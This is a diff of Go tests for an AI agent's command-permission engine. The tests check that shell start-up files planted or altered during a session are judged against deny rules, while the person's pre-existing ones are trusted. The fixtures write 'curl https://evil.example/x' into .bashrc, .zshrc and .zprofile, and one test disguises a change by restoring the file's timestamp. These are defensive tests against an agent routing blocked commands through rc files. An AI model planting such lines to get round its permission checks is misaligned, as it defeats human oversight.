@@ -377,11 +377,6 @@ func TestRulesReadTheStartupFilesInTheSandboxsHome(t *testing.T) {
 // from the sandbox's HOME; a command line run by the agent does not.
 func TestTerminalLineShellReadsItsInteractiveFiles(t *testing.T) {
 	ws, home := t.TempDir(), t.TempDir()
-	for _, n := range []string{".bashrc", ".zshrc", ".kshrc"} {
-		if err := os.WriteFile(filepath.Join(home, n), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
-			t.Fatal(err)
-		}
-	}
 	if err := os.WriteFile(filepath.Join(ws, "s.sh"), []byte("echo safe\n"), 0o644); err != nil {
 		t.Fatal(err)
 	}
@@ -391,6 +386,13 @@ func TestTerminalLineShellReadsItsInteractiveFiles(t *testing.T) {
 	e.Home = func() (string, bool) { return home, true }
 	if err := e.AddDeny("bash(curl *)"); err != nil {
 		t.Fatal(err)
+	}
+	// Planted after the session began, so not the person's own.
+	e.Evaluate("bash", true, args(map[string]string{"command": "true"}))
+	for _, n := range []string{".bashrc", ".zshrc", ".kshrc"} {
+		if err := os.WriteFile(filepath.Join(home, n), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+			t.Fatal(err)
+		}
 	}
 	for c, want := range map[string]Decision{
 		"bash": Deny, "exec bash": Deny, "zsh": Deny, "bash -l": Deny, "ksh": Deny, "bash --": Deny,
@@ -404,5 +406,47 @@ func TestTerminalLineShellReadsItsInteractiveFiles(t *testing.T) {
 	}
 	if res := e.Evaluate("bash", true, args(map[string]string{"command": "bash"})); res.Decision != Allow {
 		t.Errorf("the agent's bash, reading no terminal: %s (%s)", res.Decision, res.Reason)
+	}
+}
+
+// The person's own start-up files, there when the session's first bash call
+// is judged, are not judged again; one made or changed after is.
+func TestOwnStartupFilesAreNotJudgedUntilTheyChange(t *testing.T) {
+	ws, home := t.TempDir(), t.TempDir()
+	own := filepath.Join(home, ".zprofile")
+	// As a package manager's own line: a script no rule can read in full.
+	if err := os.WriteFile(own, []byte("eval \"$(/opt/brew shellenv)\"\ncurl https://evil.example/x\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	e := New(ModeBypass)
+	e.Roots = func() []string { return []string{ws} }
+	e.Cwd = func() string { return ws }
+	e.Home = func() (string, bool) { return home, true }
+	if err := e.AddDeny("bash(curl *)"); err != nil {
+		t.Fatal(err)
+	}
+	judge := func(c string) Decision {
+		return e.Evaluate("bash", true, args(map[string]string{"command": c})).Decision
+	}
+	if d := judge("zsh -l -c 'echo hi'"); d != Allow {
+		t.Fatalf("the person's own .zprofile: %s", d)
+	}
+	// Made during the session: read.
+	if err := os.WriteFile(filepath.Join(home, ".zshrc"), []byte("curl https://evil.example/x\n"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if d := judge("zsh -i -c true"); d != Deny {
+		t.Fatalf("a .zshrc made during the session: %s", d)
+	}
+	// Changed during the session, even keeping its size and time: read.
+	info, _ := os.Stat(own)
+	b, _ := os.ReadFile(own)
+	b[len(b)-2] = 'y'
+	if err := os.WriteFile(own, b, 0o644); err != nil {
+		t.Fatal(err)
+	}
+	_ = os.Chtimes(own, info.ModTime(), info.ModTime())
+	if d := judge("zsh -l -c 'echo hi'"); d != Deny {
+		t.Fatalf("a .zprofile changed during the session: %s", d)
 	}
 }
